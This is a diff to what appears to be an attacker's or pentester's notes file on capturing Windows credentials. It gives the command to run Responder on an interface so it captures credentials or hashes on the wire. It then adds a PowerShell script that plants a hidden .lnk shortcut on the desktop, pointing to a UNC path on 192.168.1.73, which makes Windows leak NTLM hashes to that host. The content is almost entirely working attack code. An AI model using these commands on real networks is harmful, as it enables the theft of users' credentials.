@@ -1,3 +1,13 @@
 //Use this command to capture over the wire credentials either in clear text or get the hash.
 
 #sudo responder -I eth0
+
+Capturing NTLM Hashes <---------------------------------------
+
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("$HOME\Desktop\.NTLM.lnk")
+$lnk.TargetPath = "\\192.168.1.73\.NTLM.xls"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "NTLM LNK File"
+$lnk.Save()
